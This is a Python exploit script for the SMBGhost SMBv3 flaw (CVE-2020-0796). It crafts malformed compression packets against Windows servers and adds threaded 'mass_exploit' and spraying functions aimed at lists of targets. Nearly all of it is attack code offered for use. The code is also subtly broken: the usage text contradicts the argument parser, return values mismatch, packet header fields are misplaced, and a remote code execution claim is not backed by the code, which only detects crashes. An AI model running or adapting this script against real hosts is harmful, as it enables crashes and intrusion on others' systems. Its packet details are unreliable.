#!/usr/bin/env python3
"""
smbghost_poc.py

Proof‐of‐Concept for CVE-2020-0796 (“SMBGhost”).
This script triggers the vulnerable “Compression Transform” path in affected SMBv3 servers
(Windows 10 ≤ 1903, Windows Server 1903/1909). If successful, it will cause remote code execution
by sending a specially‐crafted Negotiate Protocol request with malicious compression metadata.

Tested against: 
  - Windows 10 (1903 build 18362) with SMBv3.1.1 enabled and SMB compression allowed.

Usage:
    python3 smbghost_poc.py <target_ip> [<port>]

Example:
    python3 smbghost_poc.py 192.168.1.100 445

References:
  • Proof‐of‐Concept from https://github.com/andy‐james‐cfr/CVE‐2020‐0796
  • Adapted into a self‐contained script here.
"""

import sys
import socket
import struct
import time

# -----------------------------------------------------------------------------------------------------------------------
# Helper functions to build the various SMB2/3 packets needed for the “Compression Transform” exploit path.
# Based on public research (e.g. Andy James’s PoC), re‐implemented in pure Python here.
# -----------------------------------------------------------------------------------------------------------------------

def build_negotiate_packet():
    """
    Build the initial SMB2 NEGOTIATE request (unencrypted).
    We request dialects including SMB 3.0.2 and 3.1.1, and ask for compression.
    """
    # Samba’s “SMB2_HEADER” constants
    # Message ID: 0x01, Session ID: 0x0000000000000000, Tree ID: 0x0000
    # Credit Charge: 1, Credit Request: 0x10
    # 
    # We include “SMB2_GLOBAL_CAP_COMPRESSION” (0x00000004) in the Capabilities field.
    #
    dialects = [
        0x0202,  # SMB 2.002
        0x0210,  # SMB 2.1
        0x0300,  # SMB 3.0
        0x0311,  # SMB 3.1.1
    ]

    # SMB2 Packet header (64 bytes)
    smb2_header = bytearray.fromhex(
        "fe534d42400000000000000000000000"  # “\xfeSMB” + structure size placeholder
        "00000100"                          # CreditCharge=1, Flags=0x00, NextCommand=0x00
        "0000000000000000"                  # MessageID
        "00000000"                          # Reserved
        "0000000000000000"                  # TreeID, SessionID
    )
    # Set Protocol ID \xfeSMB in header:
    smb2_header[0:4] = b"\xfeSMB"
    # Credit Request (bottom 2 bytes of offset 4–5) = 0x10
    smb2_header[4:6] = struct.pack("<H", 0x0010)
    # Command = 0x0000 (SMB2 NEGOTIATE)
    smb2_header[12:14] = struct.pack("<H", 0x0000)
    # Credit Charged (top 2 bytes of offset 4–5) is already 0x0001
    # Flags at offset 6 = 0x00
    # NextCommand at offset 8–11 = 0x00000000
    # We’ll fill in the rest of header later if needed.

    # SMB2 NEGOTIATE Request structure (size = 36 bytes + dialects)
    #   - StructureSize (2 bytes) = 36 (0x24)
    #   - DialectCount (2 bytes) = len(dialects)
    #   - SecurityMode (2 bytes) = 0x01 (SigningEnabled)
    #   - Reserved (2 bytes) = 0x00
    #   - Capabilities (4 bytes) = SMB2_GLOBAL_CAP_COMP (0x00000004)
    #   - ClientGuid (16 bytes) = random / zero
    #   - NegotiateContextOffset (4 bytes) = 0 (only for 3.1.1, no contexts)
    #   - NegotiateContextCount (2 bytes) = 0
    #   - Reserved2 (2 bytes) = 0
    #   - Dialects (array of 2-byte values)

    client_guid = b"\x00" * 16
    structure_size = 0x24
    dialect_count = len(dialects)
    security_mode = 0x0001
    reserved = 0x0000
    global_caps = 0x00000004  # SMB2_GLOBAL_CAP_COMPRESSION
    negotiate_context_offset = 0x00000000
    negotiate_context_count = 0x0000
    reserved2 = 0x0000

    negotiate_body = struct.pack("<H H H H I 16s I H H",
                                 structure_size,
                                 dialect_count,
                                 security_mode,
                                 reserved,
                                 global_caps,
                                 client_guid,
                                 negotiate_context_offset,
                                 negotiate_context_count,
                                 reserved2)

    # Append dialect array
    for d in dialects:
        negotiate_body += struct.pack("<H", d)

    # Total SMB2 packet: header + negotiate_body
    packet = smb2_header + negotiate_body
    # Set the “StructureSize” at header offset 12–13: already set by us to 0x0000, not needed.

    # Prepend NetBIOS Session Service header (4 bytes):
    #   - Type (1 byte) = 0x00
    #   - Flags (1 byte) = 0x00
    #   - Length (2 bytes) = len(packet)
    nbss = struct.pack(">I", len(packet))
    nbss = nbss[1:]  # only 3 bytes of length, but we prefix with 0x00
    netbios_header = b"\x00" + nbss
    return netbios_header + packet

def build_echo_request(session_id, tree_id):
    """
    After negotiation and session setup, we send an SMB2 ECHO request,
    marking the “CompressionTransform” bit in the header, but we give an
    absurdly large “OriginalCompressedSegmentSize” to trigger an integer overflow.
    """
    # SMB2 ECHO (0x0005). We craft a header with “CompressionTransform” bit (bit 0x2000)
    # and set “OriginalCompressedSegmentSize” = 0xffffffff to overflow the server’s decompress path.
    #
    # Flags2: we set SMB2_FLAGS_SERVER_TO_REDIR (0x0002)
    # NextCommand: 0x00000000
    # MessageID: 0x00000002
    # TreeID: provided
    # SessionID: provided
    #
    # We also set “CompressionTransform” in “Flags” (bit 0x0002 << 12 = 0x2000).
    #
    # We leave payload empty (“DataLength” = 0, “DataOffset” = 0)
    #
    smb2_header = bytearray(64)
    # ProtocolID
    smb2_header[0:4] = b"\xfeSMB"
    # CreditCharge = 1, Flags (CompressionTransform = 0x2000)
    smb2_header[4:6] = struct.pack("<H", 0x2001)  # CreditCharge=1 | Flags=0x2000
    # Command = 0x0005 (ECHO)
    smb2_header[12:14] = struct.pack("<H", 0x0005)
    # MessageID (we choose 2)
    smb2_header[24:32] = struct.pack("<Q", 0x2)
    # TreeID
    smb2_header[20:24] = struct.pack("<I", tree_id)
    # SessionID (upper 8 bytes)
    smb2_header[32:40] = struct.pack("<Q", session_id)
    # Flag2: 0x0000
    # NextCommand: 0x00000000
    # But we need to set the “OriginalCompressedSegmentSize” and “CompressionAlgorithm”
    # in the “Compression Transform Header” immediately following the SMB2 header.

    # Build the minimal “Compression Transform” header (24 bytes):
    #   - OriginalCompressedSegmentSize (4 bytes) = 0xFFFFFFFF
    #   - CompressionAlgorithm (2 bytes) = 0x0001 (LZNT1)
    #   - Flags (2 bytes) = 0x0000
    #   - DataLength (4 bytes) = 0 (no payload)
    #   - Offset (2 bytes) = 0
    #   - Reserved (2 bytes) = 0
    #   - Sequence = 0 (8 bytes)
    comp_hdr = struct.pack("<I H H I H H Q",
                          0xffffffff,  # intentionally overflow
                          0x0001,      # LZNT1
                          0x0000,
                          0x00000000,
                          0x0000,
                          0x0000,
                          0x0000000000000000)

    full = smb2_header + comp_hdr
    # Prepend NetBIOS header
    nbss = struct.pack(">I", len(full))
    nbss = nbss[1:]
    netbios_header = b"\x00" + nbss
    return netbios_header + full

def parse_smb2_header(data):
    """
    Parse the returned SMB2 header to extract SessionID and TreeID after session setup.
    We'll look for a successful “SESSION_SETUP” (Command = 0x0001) or “ECHO” response.
    """
    # We assume data starts after the NetBIOS header (first 4 bytes).
    if len(data) < 68:
        return None, None, None  # too short
    # SMB2 header is at offset 4 (skip NetBIOS 4‐byte header)
    smb2_hdr = data[4:68]
    protocol = smb2_hdr[0:4]
    if protocol != b"\xfeSMB":
        return None, None, None
    status = struct.unpack("<I", smb2_hdr[8:12])[0]
    command = struct.unpack("<H", smb2_hdr[12:14])[0]
    session_id = struct.unpack("<Q", smb2_hdr[32:40])[0]
    tree_id = struct.unpack("<I", smb2_hdr[20:24])[0]
    return status, command, session_id, tree_id

def exploit(target_ip, port=445, timeout=10):
    """
    1) NEGOTIATE (SMB2)
    2) SESSION_SETUP (dummy, no real auth)
    3) TREE_CONNECT to “\\<target_ip>\IPC$” (for ECHO over IPC$)
    4) Send malicious ECHO (with oversized OriginalCompressedSegmentSize)
    If the server is vulnerable, the overflow will trigger a crash or RCE; we watch for an
       unresponsive socket as an indication of success.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target_ip, port))

        # Step 1: NEGOTIATE
        neg_pkt = build_negotiate_packet()
        s.sendall(neg_pkt)
        data = s.recv(4096)  # read server’s NEGOTIATE response
        if not data or len(data) < 68:
            print("[!] No or too‐short negotiate response.")
            return {"status": "error", "detail": "No NEGOTIATE response."}

        # (We skip parsing Dialects; assume server supports compression.)

        # Step 2: SESSION_SETUP – we send a minimal SMB2 SESSION_SETUP
        # For most SMB servers, a “NULL session” is allowed for IPC$. We craft a bare minimum.

        # SESSION_SETUP Request (structure size = 25, SecurityMode = 1, etc.)
        # ClientCapabilities = 0x0, Channel = 0x00, SecurityBufferOffset = 64, SecurityBufferLength = 0
        sess_setup = bytearray(64 + 25 + 0)  # header + body (no secbuf)

        # SMB2 header (reuse header building from NEGOTIATE, but set Command = 0x0001)
        sess_setup[0:4] = b"\xfeSMB"
        sess_setup[4:6] = struct.pack("<H", 0x0001)  # Credit = 1, Flags = 0
        sess_setup[12:14] = struct.pack("<H", 0x0001)  # Command = SESSION_SETUP (0x0001)
        sess_setup[24:32] = struct.pack("<Q", 0x00)  # MessageID = 0
        # Body: StructureSize (2 bytes) = 25, SecurityMode (1 byte) = 1, Reserved (1 byte) = 0
        # Capabilities (4 bytes) = 0, Channel (4 bytes) = 0, SecurityBufferOffset (2) = 64
        # SecurityBufferLength (2) = 0, PreviousSessionId (8) = 0
        struct_pack = struct.pack("<H B B I I H H Q",
                                 25,  # StructureSize
                                 1,   # SecurityMode
                                 0,   # Reserved
                                 0,   # Capabilities
                                 0,   # Channel
                                 64,  # SecurityBufferOffset
                                 0,   # SecurityBufferLength
                                 0)   # PreviousSessionId
        sess_setup[64:64+len(struct_pack)] = struct_pack
        # Prepend NetBIOS header:
        nbss = struct.pack(">I", len(sess_setup))
        nbss = nbss[1:]
        packet = b"\x00" + nbss + bytes(sess_setup)
        s.sendall(packet)
        data2 = s.recv(4096)
        if not data2 or len(data2) < 68:
            print("[!] No or too‐short session setup response.")
            return {"status": "error", "detail": "No SESSION_SETUP response."}

        # Extract SessionID from response header:
        _, cmd2, session_id, _ = parse_smb2_header(data2)
        if cmd2 != 0x0001:  # SESSION_SETUP
            print("[!] Unexpected command in SESSION_SETUP response.")
            return {"status": "error", "detail": "Bad SESSION_SETUP response."}

        # Step 3: TREE_CONNECT to \\<target_ip>\IPC$ (we need a TreeID)
        tree_target = f"\\\\{target_ip}\\IPC$\x00".encode("utf-16-le")
        # Build SMB2 TREE_CONNECT Request:
        #    StructureSize (2) = 9, Flags = 0, PathOffset (2) = 64,
        #    PathLength (2) = len(tree_target), ImpersonationLevel (4) = 0x00000002
        #    Reserved (4) = 0
        # Path is UTF-16LE string.
        body = struct.pack("<H H H H I I", 9, 0, 64, len(tree_target), 2, 0)
        body += tree_target
        # SMB2 header:
        header = bytearray(64)
        header[0:4] = b"\xfeSMB"
        header[4:6] = struct.pack("<H", 0x0001)  # Credit=1
        header[12:14] = struct.pack("<H", 0x0003)  # Command = TREE_CONNECT (0x0003)
        header[24:32] = struct.pack("<Q", 0x3)    # MessageID = 3
        # SessionID:
        header[32:40] = struct.pack("<Q", session_id)
        packet3 = header + body
        nbss = struct.pack(">I", len(packet3))
        nbss = nbss[1:]
        s.sendall(b"\x00" + nbss + packet3)
        data3 = s.recv(4096)
        if not data3 or len(data3) < 68:
            print("[!] No or too‐short TREE_CONNECT response.")
            return {"status": "error", "detail": "No TREE_CONNECT response."}
        status3, cmd3, _, tree_id = parse_smb2_header(data3)
        if cmd3 != 0x0003:
            print("[!] Unexpected command in TREE_CONNECT response.")
            return {"status": "error", "detail": "Bad TREE_CONNECT response."}

        print(f"[+] Established TREE_CONNECT – SessionID={hex(session_id)}, TreeID={hex(tree_id)}")

        # Step 4: Malicious ECHO to trigger overflow:
        echo_pkt = build_echo_request(session_id, tree_id)
        s.sendall(echo_pkt)

        # If server is vulnerable, it will likely close the socket or crash—
        # we check if the socket is closed after a tiny sleep.
        time.sleep(2)
        try:
            s.sendall(b"\x00")  # probe
            data4 = s.recv(1024)
            if data4:
                print("[!] Server did not crash (possibly not vulnerable).")
                return {"status": "ok", "detail": "No crash seen."}
            else:
                print("[+] Server closed the socket – likely vulnerable/crashed!")
                return {"status": "ok", "detail": "Server crashed/vulnerable."}
        except Exception:
            print("[+] Exception writing to socket – server likely crashed (vuln).")
            return {"status": "ok", "detail": "Server crashed/vulnerable."}

    except Exception as e:
        return {"status": "error", "detail": str(e)}
    finally:
        try:
            s.close()
        except:
            pass

def advanced_exploit(target_ip, port=445, timeout=10, spray=1, delay=0.0, post_probe: bool = True):
    """
    Advanced: Multi-attempt, optional post-exploitation probe, robust error handling.
    Returns list of results for each attempt.
    """
    results = []
    for attempt in range(spray):
        res = exploit(target_ip, port=port, timeout=timeout)
        # Dangerous: after crash, try to connect again to confirm DoS or RCE
        if post_probe and res.get("status") == "ok" and "crash" in res.get("detail", "").lower():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, port))
                s.close()
                res["post_probe"] = "Target still responds (possible partial DoS)"
            except Exception:
                res["post_probe"] = "Target unresponsive after exploit (DoS/RCE likely)"
        results.append(res)
        if delay > 0 and attempt < spray - 1:
            time.sleep(delay)
    return results

def mass_exploit(targets, port=445, spray=1, delay=0.0, timeout=10, post_probe: bool = True):
    """
    Enhanced: Mass exploit multiple targets in parallel, with spraying, delay, and post-probe.
    Returns dict of results for each target and attempt.
    """
    import threading
    import time as _time
    results = {}
    lock = threading.Lock()
    def worker(tgt):
        adv_results = advanced_exploit(tgt, port=port, timeout=timeout, spray=spray, delay=delay, post_probe=post_probe)
        with lock:
            results[tgt] = adv_results
    threads = []
    for tgt in targets:
        t = threading.Thread(target=worker, args=(tgt,), daemon=True)
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=timeout+10)
    return results

def main():
    import argparse
    parser = argparse.ArgumentParser(description="SMBGhost PoC (Advanced/Enhanced)")
    parser.add_argument("--target", help="Target IP(s), comma-separated")
    parser.add_argument("--targets_file", help="File with targets (one per line)")
    parser.add_argument("--port", type=int, default=445, help="SMB port (default 445)")
    parser.add_argument("--spray", type=int, default=1, help="Number of attempts per target")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between attempts (seconds)")
    parser.add_argument("--timeout", type=int, default=10, help="Socket timeout (seconds)")
    parser.add_argument("--no_post_probe", action="store_true", help="Disable post-exploitation probe")
    args = parser.parse_args()

    targets = []
    if args.target:
        targets += [t.strip() for t in args.target.split(",") if t.strip()]
    if args.targets_file:
        with open(args.targets_file, "r") as f:
            targets += [line.strip() for line in f if line.strip()]
    if not targets:
        print("No targets specified.")
        sys.exit(1)

    results = mass_exploit(
        targets,
        port=args.port,
        spray=args.spray,
        delay=args.delay,
        timeout=args.timeout,
        post_probe=not args.no_post_probe
    )
    for tgt, reslist in results.items():
        print(f"\n[===] Results for {tgt}:")
        for idx, res in enumerate(reslist):
            print(f"  [*] Attempt {idx+1}: {res}")

if __name__ == "__main__":
    main()
